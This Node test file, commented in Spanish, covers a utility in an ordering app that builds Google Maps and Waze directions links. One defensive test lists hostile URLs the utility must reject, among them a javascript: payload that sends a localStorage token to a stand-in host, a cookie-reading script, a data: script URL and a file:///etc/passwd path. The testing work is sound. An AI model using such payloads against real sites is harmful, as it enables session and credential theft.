// Ejecutar: node scripts/test-navegacion-negocio.cjs. Sin red, Expo ni dispositivo.
// Cubre src/utils/navegacionNegocio.ts — la única fuente de URLs de "Cómo
// llegar" (qr-recogida, negocio/[id], tienda/[id], producto/[id] y las
// tarjetas de (tabs)/pedidos): la URL manual gana, las coordenadas son el
// respaldo, sin datos no hay URL, y 0 es una coordenada válida. La URL manual
// solo se acepta si es http(s): la escribe el restaurante sin validación en
// el backend, y un `javascript:` abierto en web podría leer la sesión.
const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');
const ts = require('typescript');
const root = path.resolve(__dirname, '..');

function load(file) {
  const exportsObj = {};
  const code = ts.transpileModule(fs.readFileSync(path.join(root, file), 'utf8'), {
    compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2019, esModuleInterop: true },
  }).outputText;
  vm.runInNewContext(code, {
    exports: exportsObj, console,
    require(name) { throw new Error(`Import inesperado en una utilidad pura: ${name}`); },
  }, { filename: file });
  return exportsObj;
}

const { urlGoogleMaps, urlWaze } = load('src/utils/navegacionNegocio.ts');

const COORDS = { latitud: 14.6349, longitud: -90.5069 };

test('la URL manual gana sobre las coordenadas', () => {
  const n = { ...COORDS, google_maps_url: 'https://maps.app.goo.gl/abc', waze_url: 'https://waze.com/ul/xyz' };
  assert.equal(urlGoogleMaps(n), 'https://maps.app.goo.gl/abc');
  assert.equal(urlWaze(n), 'https://waze.com/ul/xyz');
});

test('la URL manual se recorta; una vacía o de solo espacios no cuenta', () => {
  assert.equal(urlGoogleMaps({ google_maps_url: '  https://maps.app.goo.gl/abc  ' }), 'https://maps.app.goo.gl/abc');
  assert.equal(urlWaze({ ...COORDS, waze_url: '   ' }), 'https://waze.com/ul?ll=14.6349,-90.5069&navigate=yes');
  assert.equal(urlGoogleMaps({ google_maps_url: '' }), null);
});

test('cada app usa su propia URL manual: tener solo la de Maps no inventa la de Waze', () => {
  const n = { google_maps_url: 'https://maps.app.goo.gl/abc' };
  assert.equal(urlGoogleMaps(n), 'https://maps.app.goo.gl/abc');
  assert.equal(urlWaze(n), null);
});

test('sin URL manual, se arma desde las coordenadas', () => {
  assert.equal(urlGoogleMaps(COORDS), 'https://www.google.com/maps/dir/?api=1&destination=14.6349,-90.5069');
  assert.equal(urlWaze(COORDS), 'https://waze.com/ul?ll=14.6349,-90.5069&navigate=yes');
});

test('coordenadas numéricas en texto (numeric de Postgres) también sirven', () => {
  assert.equal(urlWaze({ latitud: '14.6349', longitud: '-90.5069' }), 'https://waze.com/ul?ll=14.6349,-90.5069&navigate=yes');
});

test('sin datos suficientes → null', () => {
  for (const n of [null, undefined, {}, { latitud: 14.6 }, { longitud: -90.5 },
    { latitud: null, longitud: null }, { latitud: '', longitud: '' }, { latitud: 'abc', longitud: -90.5 },
    { google_maps_url: null, waze_url: null }]) {
    assert.equal(urlGoogleMaps(n), null, JSON.stringify(n));
    assert.equal(urlWaze(n), null, JSON.stringify(n));
  }
});

test('0 es una coordenada válida (no se descarta por "falsy")', () => {
  assert.equal(urlGoogleMaps({ latitud: 0, longitud: 0 }), 'https://www.google.com/maps/dir/?api=1&destination=0,0');
  assert.equal(urlWaze({ latitud: 0, longitud: -90.5 }), 'https://waze.com/ul?ll=0,-90.5&navigate=yes');
  assert.equal(urlWaze({ latitud: 14.6, longitud: 0 }), 'https://waze.com/ul?ll=14.6,0&navigate=yes');
});

// Las 4 pantallas que tenían la lógica duplicada ya no arman URLs a mano.
test('ninguna pantalla vuelve a duplicar la construcción de URLs de navegación', () => {
  const pantallas = ['app/qr-recogida.tsx', 'app/negocio/[id].tsx', 'app/tienda/[id].tsx',
    'app/producto/[id].tsx', 'app/(tabs)/pedidos.tsx'];
  for (const p of pantallas) {
    const src = fs.readFileSync(path.join(root, p), 'utf8');
    assert.match(src, /from '@\/src\/utils\/navegacionNegocio'/, `${p} usa la utilidad`);
    assert.doesNotMatch(src, /google\.com\/maps\/dir|waze\.com\/ul\?ll=/, `${p} no arma URLs a mano`);
  }
});

// ── Seguridad: las URLs manuales las escribe el restaurante ──────────────────

test('URL manual con esquema no web (javascript:, data:, intent:…) se descarta y cae a coordenadas', () => {
  const peligrosas = [
    'javascript:alert(document.cookie)',
    '  JavaScript:fetch("https://x.test?t="+localStorage.token)',
    'data:text/html,<script>alert(1)</script>',
    'intent://maps#Intent;scheme=http;end',
    'vbscript:msgbox(1)',
    'file:///etc/passwd',
    '//evil.test/maps',
    'www.google.com/maps',
    'maps.google.com',
    'https://',
    'https://evil.test/ruta con espacios',
  ];
  for (const url of peligrosas) {
    const n = { ...COORDS, google_maps_url: url, waze_url: url };
    assert.equal(urlGoogleMaps(n), 'https://www.google.com/maps/dir/?api=1&destination=14.6349,-90.5069', url);
    assert.equal(urlWaze(n), 'https://waze.com/ul?ll=14.6349,-90.5069&navigate=yes', url);
    // Sin coordenadas de respaldo: null, nunca la URL peligrosa.
    assert.equal(urlGoogleMaps({ google_maps_url: url }), null, url);
    assert.equal(urlWaze({ waze_url: url }), null, url);
  }
});

test('URL manual http/https (cualquier mayúscula) sí se acepta', () => {
  assert.equal(urlGoogleMaps({ google_maps_url: 'HTTPS://maps.app.goo.gl/abc' }), 'HTTPS://maps.app.goo.gl/abc');
  assert.equal(urlWaze({ waze_url: 'http://waze.com/ul/xyz' }), 'http://waze.com/ul/xyz');
});

test('pedidos del cliente: en web abre con noopener,noreferrer (sin acceso a window.opener)', () => {
  const src = fs.readFileSync(path.join(root, 'app/(tabs)/pedidos.tsx'), 'utf8');
  assert.match(src, /\.open\(url, '_blank', 'noopener,noreferrer'\)/);
  assert.doesNotMatch(src, /\.open\(url, '_blank'\)/);
});

// ── qr-recogida ──────────────────────────────────────────────────────────────

test('qr-recogida ya no cae en Alert.alert sin ubicación (en web no se ve nada)', () => {
  const src = fs.readFileSync(path.join(root, 'app/qr-recogida.tsx'), 'utf8');
  assert.doesNotMatch(src, /Sin ubicación/);
});

test('qr-recogida: sin URL ni coordenadas conserva nombre/dirección/referencia y oculta solo los botones', () => {
  const src = fs.readFileSync(path.join(root, 'app/qr-recogida.tsx'), 'utf8');
  assert.match(src, /\{\(tieneDatosNegocio \|\| tieneNavegacion\) && \(/, 'la tarjeta depende de que haya datos, no solo URLs');
  assert.match(src, /negocioNav\?\.nombre \|\| negocioNav\?\.direccion \|\| negocioNav\?\.zona \|\| negocioNav\?\.punto_referencia/);
  const tarjeta = src.slice(src.indexOf('(tieneDatosNegocio || tieneNavegacion) && ('));
  const botones = tarjeta.indexOf('{tieneNavegacion && (');
  assert.ok(botones > 0, 'los botones van dentro de su propio condicional');
  assert.ok(tarjeta.indexOf('navReferencia') < botones, 'la referencia se pinta fuera del condicional de botones');
  assert.ok(tarjeta.indexOf('abrirUrl(urlMaps)') > botones, 'Google Maps solo dentro del condicional');
});
